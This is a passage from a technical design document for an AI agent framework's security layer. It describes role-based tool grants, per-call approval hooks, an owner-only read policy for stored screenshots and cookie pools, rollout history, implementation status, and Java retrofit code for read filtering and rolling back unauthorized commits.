- Granting a privileged group requires a confirmation step and writes a security-change audit record.
- Removing the last grant of `agent.authoring` from all roles warns that no one will be able to
  administer agents.
- The editor cannot express anything about enforcement, because there is nothing to express: every
  cell it edits is a grant, and every grant is applied.

**Export.** The matrix exports as the `<tool-access>` XML of section 4.1, so a configuration developed
interactively can be committed to version control - the same round-trip administrators expect from
`<security-config>`.

### 4.4 Defaults for a new tool

1. Tool author sets `group` on `@ToolMethod`. If they forget: ungrouped -> denied to everyone ->
   appears in the review queue.
2. No existing grant reaches a group it does not name, so a tool in a new group needs an administrator
   to add that group deliberately - a **privileged** one above all.
3. If the group is ordinary, roles already granted that group get it. This is the deliberate trade-off
   that makes groups worth having: adding `getInvoiceById` to `data.read` grants it to everyone with
   `data.read`, and the compensating control is L2 - the tool still cannot return an object the user
   may not read.
4. MCP tools arrive at runtime and cannot be annotated. They default to **ungrouped/denied** and must
   be granted through `<tool-groups>` (section 4.1) - explicitly, tool by tool, ideally into `egress`.

### 4.5 Deciding approval from the call, not only from the tool · **implemented** (#381)

`SecurityContext.checkApproval(Tool, ToolCall)` receives the call with its arguments and can
therefore answer two calls of the same tool differently. The default answers by
[`ToolMode`](../../tl-ai-tool-api/README.md) alone, which is right for most applications and wrong for
one whose authority follows the *state of the object*: overwriting an empty section a machine wrote,
overwriting what a colleague wrote, and releasing a document to a customer are all `DATA_WRITE`, and
only the second and third deserve a prompt. `ApprovalMode` cannot express that - it decides *who*
answers a prompt, not *whether* one is raised.

The seam is the factory that builds the context of a run:

```xml
<config service-class="com.top_logic.tl.ai.core.provider.LLMService">
    <instance>
        <security-context class="com.acme.agent.SectionApproval"/>
    </instance>
</config>
```

```java
public class SectionApproval implements SecurityContextFactory {
    @Override
    public SecurityContext createSecurityContext(RunPrincipal run) {
        SecurityContext base = DefaultSecurityContextFactory.defaultContext(run);
        return new SecurityContextProxy(base) {   // ships with the seam; delegates everything
            @Override
            public PermissionDecision checkApproval(Tool tool, ToolCall call) {
                // ... read the object the call names, answer Allowed or NeedsApproval
            }
        };
    }
}
```

What the factory is told is a `RunPrincipal`: the account the run acts as, how the run was started
(`CHAT`, `SCRIPT`, `MCP`, `SCHEDULED`, `INTERNAL`), whether anybody is there to answer a prompt, and
the conversation the run belongs to when the entry point has one. The run has no id and no agent yet -
those are settled after the context is built.

Three rules:

- **Every entry point asks.** `RunSecurity.contextFor` is the one call, and the chat, the TL-Script
  functions, the MCP endpoint and the prompt improver all go through it. An application substitutes
  one implementation, not five call sites.
- **Configuring nothing changes nothing.** The default is `DefaultSecurityContextFactory`, which is
  what each entry point built by hand before.
- **A factory may narrow and it may not widen.** Everything else about a run - which tools, which
  agents, which objects - is decided against the account's roles, and a context written from scratch
  would answer all of that permissively - `SecurityContext`'s fifteen methods have permissive
  defaults. Build `DefaultSecurityContextFactory.defaultContext(run)`, wrap it in
  `SecurityContextProxy`, and override the one answer that is to differ.

### 4.6 The shipped read policy for perceivable binaries · **implemented** (#227)

Everything above is a seam an application fills. This module fills one of them itself, for the two
types it stores that are *perceivable*: `tl.ai.screenshots:Screenshot` and
`tl.ai.cookiepool:CookiePool`. Both are reachable through `viewDocument`, which loads a
`tl.core:Binary` attribute into a model's context, and neither is business data an application
models: a screenshot is a picture of a page somebody drove a browser to while logged in somewhere,
and a cookie pool is that login. "Who may read one" is therefore not a question this module may
leave to whoever deploys it.

**The policy: the owner, plus administrators.** A binary whose owner cannot be resolved - one an
unattended run produced, with no `Person` to name - is readable by administrators and by code in a
system context, and by nobody else.

It is written as configuration, not as code, in
`tl-ai-core/src/main/webapp/WEB-INF/conf/tl-ai-core.binarySecurity.config.xml`, in three pieces
that are each the engine's own mechanism:

| Piece | What it does |
|---|---|
| `InitialRolesManager` role `AiBinaryOwner` | a technical role meaning "this object belongs to you". Nobody holds it globally. |
| two `<role-rules>` of `type="reference"` | derive it, per object, from `Screenshot#owner` / `CookiePool#owner`. A path ending at a `Person` resolves to that person's representative group. An empty `owner` produces **no holder**, which is how the null-owner rule is written - as the absence of a holder, not as a denial somebody has to remember to configure. |
| `<security-config>` `Read` grants | make the role count, per type, and only for `Read`. |

Nothing here is a second check: enforcement stays `ModelSecurity.canRead` ->
`ModelAccessRights.isAllowed`, exactly as section 3.3 describes it. The "plus administrators" half
is not granted at all - it is `SecurityConfigurationService.isAllowedBypass`, which answers before
any role is looked up, and writing a grant for it would be a second place saying the same thing.
`Write`, `Delete` and `Create` are granted to nobody and therefore stay with the administrators they
were already with: what an owner may do with their own screenshot beyond looking at it is a question
#227 did not answer.

Two boundaries worth stating, because both look like gaps and are not:

- **A shared cookie pool is still owner-plus-administrator on the read path.** `CookiePoolService`
  lets every session *select* a shared pool to drive a browser with, and that path never asks model
  security. Sharing a login is not the same as letting a model read the stored session state.
- **`/screenshot/{id}` does not ride this policy.** It serves bytes to a browser, not to a run, and
  asks `ScreenshotService.mayRead`, which states the same sentence in Java. The two agree by
  construction; an installation that *widens* the model grant does not widen the route, which is
  the conservative direction of the two.

An installation that wants a wider rule adds its own role to the grants, or a role rule of its own
that puts `AiBinaryOwner` on the objects a reporting role is to reach. It never has to narrow
anything, because nothing shipped grants more than ownership.

Upgrading needs no step: a derived role is computed at commit, so binaries created after the upgrade
carry it at once, and the ones that existed before it are covered because `ElementAccessManager`
hashes the configured role rules into `DBProperties` and rebuilds the security storage when that hash
changes - which adding these two rules does. Nothing becomes less accessible in the meantime either:
before this configuration existed, model access to both types was deny-by-default, so
non-administrators read neither.

`TestPerceivableBinaryReadPolicy` pins all of it against the shipped configuration - the accounts,
the objects and the rules are real, so a passing test is a statement about what this module deploys.

---

## 5. Rollout and migration

The hard constraint: **both layers are deny-by-default**, so switching everything on at once turns
every existing agent into an agent that can do nothing. The sequencing below stops data loss first and
defers the changes that need application-side policy authoring.

**The phasing below is history, not a plan.** It was written for an installed base and a permissive
default, and issue **#288** removed both: enforcement is unconditional from now on, so an application
that has not authored a policy is simply an application whose agent can do almost nothing. The phases
are kept because they record what was built in which order and why, and because phases 3 to 5 still
name the work that is open.

### Phase 0 - Observability (no behaviour change) · **dropped**

Ship L6 audit and a **dry-run** evaluator: compute the L1 and L4 decisions, log what *would* have been
denied, enforce nothing. It existed to give an installed base the input for writing its policy. With no
installed base and no permissive mode there is nothing to dry-run against, so it was never built.

### Phase 1 - Identity, MCP authentication · **done**

- Every run carries a `Person` or refuses to start (3.1). The mode seam this phase originally
  introduced was deleted again by #288.
- `/mcp/*` authenticates every request and builds a real `ToolContext` for the account it resolved
  (3.7, issue **#261**). The endpoint is still not served unless an application switches
  `MCPServerService$Module` on, and it serves nothing until that application also configures an
  authentication.

MCP authentication was pulled forward because it was the only externally reachable unauthenticated
path, and it is independent of any application writing a `<security-config>`.

### Phase 2 - Pre-commit guard · **implemented** - and result filtering

L4 and L3. Deliberately **before** L1/L2 enforcement: these are the layers that stop unauthorized
writes and data leaving, they work without any per-application tool policy, and they are the ones that
still protect an application that never gets round to writing a policy.

**Built:** L4, the pre-commit guard of section 3.5 - `PreCommitGuard`, `ModelSecurityPreCommitGuard`,
`ToolChangeSet` and the call in `AgentLoop.commitTransaction`. It runs for every turn that opened a
transaction; turns that wrote nothing never open one and pay nothing.

**Built:** L3 for the data tools - the `ReadFilter` chokepoint of section 3.3.2, issue **#289**.
Removing the permissive mode made those leaks live rather than latent, which is why #289 came next.

**Built:** L3 for the MCP *resource* surface, with #261. It serialized instances the way the two
tools used to, in a system interaction, and was covered by no policy at all; it now reads in the
authenticated account's context and discloses through the same `ReadFilter`
([mcp-endpoint.md](mcp-endpoint.md)).

**Built:** L3 for the model digest and the vector index, with #295 - the digest bounded by
`accessibleTypes(READ)` (3.4.2), the index filtered per hit at query time (3.4.3). Neither has a form
that skips the check.

**Still open:** the model-metadata half of the MCP resource surface and `ModelBrowserTool`'s
type-at-a-time enumeration, which disclose model structure rather than business data and need the
`accessibleTypes(READ)` bound of 3.4.2 rather than the read filter. And, as a decision rather than as
work: whether the vector index should stop *indexing* content its readers may not read (3.4.3).

### Phase 3 - Tool RBAC · **implemented, except the administration UI**

`AiToolAccessService`, the group taxonomy and the admin UI. The policy is applied to every run; what
an application decides by writing `<tool-access>` is what its agents can reach, not whether they are
checked.

**Built:** `AiToolAccessService` reading the section 4.1 XML, with boot-time role validation; all 75
registered tools assigned to the taxonomy through `@ToolMethod(group = ...)`; `hasToolPermission`
enforcing against the roles the run's principal holds; the entry points passing that principal; the
`<background-allowlist>` ceiling; and denials that name the missing capability to both the model and the
log. Administrator-facing documentation is
[tool-access-configuration.md](tool-access-configuration.md).

**Not built:** the administration UI of section 4.3 - no matrix editor, no effective-permissions
inspector, no new-tool review queue. The policy is edited as configuration. Nor is there a per-role
"pre-approved for `data.write`" (open question 6 stays open): approval remains per tool mode, for every
role.

### Phase 4 - Model ABAC

L2 in the Java tools, once the application has a `<security-config>`. `getAccessibleTypes` returning
empty for a user is the signal that the application has not yet written one, and produces a targeted
warning rather than a silent empty answer:

> `No model access rights are configured for your roles. The AI assistant cannot access application data until an administrator configures <security-config>.`

### Phase 5 - Remove the security mode · **done** (#288)

`LEGACY`, `SYSTEM` and the whole ceiling/floor machinery are deleted. Unattended runs get a
**configured service account** instead of `SYSTEM`: a real account holding real roles on the security
root, administered like any other. Such a run is then bounded three ways, all visible and all
auditable - the account's roles at L1, its per-object rights at L2, and the `<background-allowlist>`
because no human can approve. That is strictly more supervision than `SYSTEM` gave.

### What an application has to do

| Application | Behaviour |
|---|---|
| No `<security-config>`, no `<tool-access>` | The agent may call the read tools (`DEFAULT_BASELINE`) and model access is deny-all, so it can ask and be told nothing. **Still the state to fix** - see [role-model-worked-example.md](role-model-worked-example.md) - but the agent is usable the moment a `<security-config>` appears |
| `<security-config>` present, no `<tool-access>` | The intended smallest working setup: read tools from the default baseline, data rights per object from the engine |
| Both present | The intended state |
| Uses `/mcp/*` from an external client | Two switches, both explicit. **The endpoint is not served** until the application switches `MCPServerService$Module` on - it ships `false` and answers 503. With the module on but no `<authentications>` configured it still answers 503, because it serves no request it cannot attribute to an account. Once a credential is configured, the client authenticates on every request and then reaches exactly what its account reaches: tools by `<tool-access>` bounded by the `<background-allowlist>`, resources filtered by that account's model access rights - see [mcp-endpoint.md](mcp-endpoint.md) |
| Uses `aiAgentChat` from TL-Script | Runs as the calling account. A script that relied on the unrestricted fallback fails with a clear message instead of running unchecked |
| An unattended entry point (a scheduler) | Must supply a configured service account. None exists in the code today, so there is nothing wired yet |

---

## 6. What is built on this branch

tl-ai builds against released engine **`8.0.0-alpha9`**, which contains #29088 (released in
`8.0.0-alpha7`), so the whole design compiles against the real API - nothing here is reference code
any more. All new types live in `tl-ai-core/src/main/java/com/top_logic/tl/ai/core/security/`.

| Artifact | Status |
|---|---|
| `AiSecurityMode` - the three modes, `resolve(...)` and `stricter(...)` | **Removed** (#288). Enforcement is unconditional; identity is the only input. See 3.1 |
| `ToolGroups` - the built-in group names and the privileged set | Implemented, unit-tested. **Lives in `tl-ai-tool-api`**, not next to the policy: a tool must be able to name its group without depending on the module that enforces it, and `tl-ai-vector-index` (which depends on `tl-ai-tool-api` alone) proved the point |
| `ToolAccessPolicy` - the admin config interface of section 4.1 | Implemented; the XML in 4.1 is what it produces. **Read by `AiToolAccessService`**. Its `<baseline>` is a nullable item with three states - absent (the default), empty (nothing), declared (exactly that) - see #293 |
| `AiToolAccessService` - the service of section 4.1 | **Implemented.** Reads the policy, validates role names at boot with `context.error(...)`, refuses a granting policy with no `<background-allowlist>`, resolves the roles a principal holds on the security root, and indexes the tool registry for name resolution. `authorizationFor` throws if the service is down rather than granting everything |
| `RoleToolAccess` - the role-to-tool decision | **Fully implemented and unit-tested** (one case per row of the 4.1 table, plus name matching, the background allowlist and the default baseline). Carries `DEFAULT_BASELINE` (#293) with the reasoning for every group left out of it. **Called by `ToolAuthorization`** |
| `ToolAuthorization` - the run-scoped decision | **Implemented and unit-tested.** Binds the policy to the run's principal, held roles and background flag; applies the administrator bypass and the background ceiling; audits denials |
| `ToolIdentity` - how the policy names a tool | **Implemented.** A grant matches the bare tool name, the configured `{factory}.{tool}` name, or the provider-safe `factory__tool` form, so a correctly spelled grant cannot silently miss |
| `ModelSecurity` - the typed façade | Implemented. `UNCHECKED` survives only as a test seam; every production context carries `ModelAccessRightsSecurity` |
| `ModelAccessRightsSecurity` - the `ModelAccessRights`-backed implementation | **Real and unit-tested** (8 cases against a stub rights service). Replaces what was appendix A |
| The shipped read policy for `Screenshot` and `CookiePool` (4.6) | **Implemented** (#227). `tl-ai-core.binarySecurity.config.xml`: the `AiBinaryOwner` role, two role rules deriving it from each type's `owner`, and `Read` grants naming it. Configuration, not code - enforcement stays `ModelSecurity.canRead`. Pinned by `TestPerceivableBinaryReadPolicy` against the shipped configuration |
| `ToolSecurityException` - the denial a tool raises | Implemented; raised by `ModelSecurity.requireRead`/`requireWrite`. The read path prefers absence to a denial, so a hidden object produces the "not found" of `TidResolver` rather than this exception - saying "exists but hidden" is the disclosure #289 removed |
| `ReadFilter` - the disclosure chokepoint | **Implemented and unit-tested** (`TestReadFilter`, 18 cases) and end-to-end against the fixture (`SecDemoReadFilterTest`). Cannot be constructed without a `ModelSecurity`; `TidResolver.resolve` has no form that skips the read check, and `ExecutionResult.toJson` none that skips the filter (#289). **It is a chokepoint for `TLObject`s, not for everything a script can return**: a value TL-Script has already reduced to plain data carries no object to recognise, so a count (#291) and a label reached through string coercion (#296) pass through by design. Both are asserted in `SecDemoReadFilterTest` rather than left implicit - see 3.3.2 |
| `ModelDigestGenerator` - the whole-model digest | **Scoped** (#295). `generate(model, includeFramework, ModelSecurity)` is the only form; emits `accessibleTypes(READ)` and drops a module whose classes are all inaccessible. End-to-end against the fixture (`SecDemoModelDigestTest`). The bound is types, not objects - see 3.4.2 for the three boundaries it does not claim |
| `VectorReadFilter` - the vector index's query-time filter | **Implemented** (#295) and end-to-end against the fixture (`SecDemoVectorIndexTest`). `VectorIndex.searchVectorIndex` has no form without a `ReadFilter`; the store's own hit list is private to that class. Over-fetches, resolves each hit's source through `TidResolver`, drops what is unreadable or unattributable. Index *contents* stay unrestricted by construction - 3.4.3 states the trade-off that decision carries |
| `SecurityContext.modelSecurity()`, `ToolContext.modelSecurity()` | The seam every tool reaches. `securityMode()` is gone (#288) |
| `SecurityContext.hasToolPermission` + `toolDenialReason` | **Enforcing.** `TopLogicSecurityContext` answers both from the policy; `ToolPermissionFilter` and `AgentLoop` prefer the specific reason over a generic "denied" |
| `TopLogicSecurityContext.forRun(principal, background)` | The single production entry point. Refuses a run with no principal, and binds the model rights and the tool authorization once. **Called by the chat and TL-Script entry points** |
| `SecurityContext.restrictedTo(...)` / `ToolContext.restrictedTo(...)` | **Removed** (#288). There is no per-run mode left to compose |
| `PreCommitGuard` + `ModelSecurityPreCommitGuard` + `ToolChangeSet` - the L4 guard | **Implemented and wired** (#259). Called once per turn from `AgentLoop.commitTransaction`, only when a transaction is active; reads the change set from the engine's transaction bookkeeping; rolls the turn back through the existing failed-tool-call route. Unit-tested (`TestPreCommitGuard`, `TestAgentLoop`) and end-to-end against the fixture (`SecDemoPreCommitGuardTest`) |
| `@ToolMethod(group = ...)` in `tl-ai-tool-api` | **Enforced.** All 75 registered tools carry a group; `Tool.group()` is the runtime seam |
| `@ToolMethod(types = ...)` | **Implemented** (#258). `DeclaredTypeAccess` refuses a declared tool whose declared types the principal may read none of, and `ToolPermissionFilter` drops it from the provider request for the same reason, and `AgentCapabilities` applies it to the catalog, skill and delegate surfaces. Section 3.3.3; no shipped tool declares one, and that section says why |
| Per-agent `security-mode` (4.2) | Built (#260) and **removed again** (#288), together with the model attribute, the service-editor selector and `SecDemoAgentFloorTest` |
| Per-agent `required-groups` (4.2) | **Dropped** (#392). A self-imposed narrowing an agent's own author could remove; replaced by `<agent-access>`, `<model-access>` and `<mcp-access>`, which are keyed by role |
| `<agent-access>` / `<model-access>` / `<mcp-access>` (4.2) | **Implemented** (#392). `RoleAccessPolicy` decides all three; `RunAuthorization` carries the decision on the security context; `AgentFactory` enforces it before the run starts; `/chat/capabilities` filters and `/chat/send` answers 403 |
| Boot warnings for a policy that reaches nobody | **Implemented** (#289). A `<tool-access>` role that no role rule can produce **on the security root** is warned about through `AccessManager.canHaveRole`, and a role granted `data.read`/`data.write` that appears in no Read/Write/Create grant of `<security-config>` is warned about too - the "Dora" case of the worked example. Warnings, not errors: a direct runtime assignment can still arrive, and model rights can come from a `<part>` grant or an annotation this check does not read |
| The retrofit examples A.1 / A.2 | **Applied.** A.1 is the shipped shape of `InstanceBrowserTool` and A.2 the shipped shape of the pre-commit guard |

**An application that writes no `<tool-access>` gets a read-only agent.** The `AiToolAccessService`
module is active by default and evaluates an empty policy, which grants
`RoleToolAccess.IMPLICIT_BASELINE` plus `RoleToolAccess.DEFAULT_BASELINE` - `model.read` and
`data.read`, asserted by `TestDefaultBaseline`. Every role grant beyond that has to be authored, and
`TestTopLogicSecurityContext` pins that a role the policy does not mention reaches nothing. The module
is on by default deliberately: a policy present while the module was off would be silently ignored,
which is the one failure mode this layer must not have. Since **#289** the default's `data.read` *is*
the per-object guarantee section 3.1 describes, for **objects and attribute values**; the two values a
script reduces to plain data first are outside it and stay so - a count (**#291**) and a label reached
through string coercion (**#296**, section 3.3.2). Note that `script` is *not* in the default baseline,
so neither is reachable by an application that authored no policy. The pre-commit guard is wired and
enforcing, subject to the limits section 3.5 states.

Two behaviour changes arrive for TL-Script callers. `aiAgentChat` and `aiAgentChatAsync` act as the
account that ran the script, and a call from a thread with no bound account is **refused** rather than
run unrestricted. `aiCallTool` applies the tool permission check itself, since it dispatches a tool
directly and never passes the agent loop's gate.

The one behaviour change that does arrive with `8.0.0-alpha7` is the **engine's own**, not tl-ai's:
TL-Script now applies model access rights (`CreateObject` checks CREATE, attribute reads are
filtered), and those rights deny by default. An application without a `<security-config>` therefore
sees TL-Script creates and reads denied for non-administrators. This
affects `TLScriptTool.executeTLScript` and every script tool. Engine `UpdateSecurityVisitor
.disableSecurity(expr)` is the documented opt-out for internal queries.

See the branch's PR description for the build and test commands that were actually run.

---

## 7. Open questions

1. **Role scope for tool grants.** This design reads roles on the security root (3.2.2). Should a role
   held only on a subtree ever grant a tool? Current answer: no - tool access is a global capability,
   instance nuance is L2's job. Revisit if an application needs "may use the contract tools, but only
   in the contracts module".
2. **Attribute-level filtering in serializers.** L2 supports `canRead(obj, attr)`, but the msgbuf
   serializers used by the tools do not currently have a per-attribute hook. Adding one touches every
   `messages/*.proto`. Worth it, or is object-level filtering enough for v1?
3. **`ChangeSet` extraction cost.** L4 needs the touched attributes per object from the KB transaction.
   The exact API and its cost on large transactions needs measuring before the guard is enabled by
   default.
4. **Per-agent `<security-config>` overlays.** Should an agent be able to *narrow* model access beyond
   the user's own rights (e.g. "this agent may read Customer but never Contract, even for a manager")?
   `<agent-access>` (4.2) decides which agent a user may run at all; narrowing the *data* an agent may
   reach below its user's own rights is the type-granularity equivalent and is unspecified.
5. **Indexing unreadable content.** Answered for the query side by #295 - each chunk does carry its
   source id, in the payload since the beginning and in the metadata since #295, so no re-indexing was
   needed. What stays open is the guarantee above it: query-time filtering keeps restricted text out of
   the answer, it does not keep restricted text out of the index. A per-principal or per-role index
   would, at the cost of multiplying embedding and storage by the number of rights profiles and turning
   a rights change into a re-indexing job. Section 3.4.3 states the trade-off; the decision is the
   owner's.
6. **Approval semantics under RBAC.** Today `DATA_WRITE` -> `NeedsApproval` for everyone. Should a role
   be able to carry "pre-approved for `data.write`", turning approval into a per-role property rather
   than a constant of the tool's `ToolMode`?
7. **The unattended entry point.** #288 settled that an unattended run acts as a configured service
   account, and no scheduler-initiated agent run exists in the code, so nothing is wired. Where the
   account is configured - one per scheduler job, one per application - is open.

---

## Appendix A - retrofit examples

The `ModelAccessRights` binding that used to be reference code in this appendix is now real: see
`ModelAccessRightsSecurity` in `tl-ai-core`, unit-tested by `TestModelAccessRightsSecurity`. Both
retrofit examples below are now shipped code rather than illustrations.

### A.1 `InstanceBrowserTool.doListInstances` · **implemented** (#289)

Filter **before** the count and **before** the page is cut. An unfiltered `totalCount` discloses
cardinality the user may not see, and a page cut before the filter discloses it through short pages.

```java
private InstanceListResponse doListInstances(String moduleName, String typeName,
        Integer limit, String cursor, ReadFilter readFilter) {

    TLClass type = MetaElementUtil.getGlobalType(moduleName, typeName);
    // ... validation as today ...

    List<TLObject> allInstances =
        readFilter.readable(MetaElementUtil.getAllInstancesOf(type, TLObject.class));

    int totalCount = allInstances.size();
    // ... pagination over the filtered list ...
}
```

The `ReadFilter` arrives from the injected `ToolExecutionContext` (`ReadFilter.of(context)`), which
refuses a call that has no agent run to name a principal. There is no overload without it.

### A.2 The pre-commit guard in `AgentLoop.commitTransaction` · **implemented**

The shape the layer of section 3.5 actually has. `PreCommitGuard.forRun` is the one place its mode gate
lives, and it is asked whether it `enforces()` *before* the change set is read, so an unenforcing run
pays nothing.

```java
private void commitTransaction(ToolContext context, Conversation conversation,
        AgentEventListener listener, String runId, int turn) {
    TransactionScope scope = context.transaction();
    if (!scope.isActive()) {
        // No write tool ran this turn: nothing to commit and nothing to guard.
        return;
    }
    if (!preCommitGuardPasses(context, conversation, listener, runId, turn)) {
        return;
    }
    // ... existing commit path ...
}

private boolean preCommitGuardPasses(ToolContext context, Conversation conversation,
        AgentEventListener listener, String runId, int turn) {
    SecurityContext security = context.security();
    PreCommitGuard guard = PreCommitGuard.forRun(security);
    if (!guard.enforces()) {
        return true;
    }
    List<PreCommitGuard.Violation> violations =
        guard.check(security, context.transaction().changes());
    if (violations.isEmpty()) {
        return true;
    }
    rollbackTurn(context, conversation, listener, runId, turn, "Pre-commit security check failed",
        "The data changes of this turn were rolled back and NOT persisted, because your account is"
            + " not permitted to make all of them: " + PreCommitGuard.describe(violations) + " ...");
    return false;
}
```

`rollbackTurn` is the route a failed tool call already took: it rolls the transaction back, emits
`AgentEvent.TransactionRolledBack`, and appends the `[Framework notice]` that corrects the picture the
model was left with. There is deliberately **one** such route - a second one would mean "all-or-nothing"
could come to mean two different things. The per-violation audit record is written by the guard itself,
where the principal is bound, in the same shape as a `ToolAuthorization` denial.

### A.3 A commit the application refuses · **implemented**

A commit can also be refused by the application rather than by the guard: a model constraint, a
mandatory attribute nobody filled, an own `CommitChecker`. That is not a security decision, but it
ends the turn the same way, and it has the same four obligations - the log, the model, the user and
the transcript. The route is the one above; what makes it reachable is that **`TransactionScope.commit()`
wraps every failure the engine can raise into a `TransactionException`**.

That is not a formality. `DefaultDBContext.commitTransaction` picks the exception it throws by cause,
not by layer: `KnowledgeBaseException` for a poisoned or failed transaction, but a bare
`I18NRuntimeException` for a veto - `ModelService.checkCommit` throws `TopLogicException` for a
constraint violation and the engine rethrows it unwrapped. A scope that caught only the first let a
refused write escape the whole run; the chat's catch-all then announced it to the browser as
`provider_error` of kind `UNKNOWN`, which reads as *"the model reported an error, you can send
again"* - for the application's own refusal, and for a message that will be refused again (issue
#410).

What the four obligations look like now:

| | |
|---|---|
| **Log** | `AgentLoop.commitTransaction` writes one ERROR line naming run, turn and cause. Nothing else logs it: the scope wraps without logging and the rollback event is only traced at DEBUG. |
| **Model** | the `[Framework notice]` of `rollbackTurn`, naming the refusal, stating that every tool result of the turn is void, and telling it not to retry the identical change. |
| **User** | the run completes normally and the turn is reported rolled back. A failure that does reach the chat's catch-all is classified `ChatProcessor.APPLICATION_ERROR` rather than as a provider kind, and the chat says the application could not complete the request - not that the model erred. |
| **Transcript** | `ConversationLogListener` retracts the turn's writes to `ToolCallStatus.ROLLED_BACK` with the reason, so a reloaded conversation does not replay a success no revision holds. |

The `StopReason` stays honest throughout: a refused commit ends the turn, not the run, so the run
still ends `COMPLETE` and no `ProviderError` event is emitted. Pinned by
`TestCommitFailureReason.testVetoedCommitFailsAsATransactionFailure` (the engine-level wrap),
`TestAgentLoop.testEngineCommitFailureIsNotAProviderError` / `…IsLoggedWithTheRun` /
`…testRefusedCommitIsRecordedAsRolledBack`, and `TestChatErrorKind` in `tl-chat`.
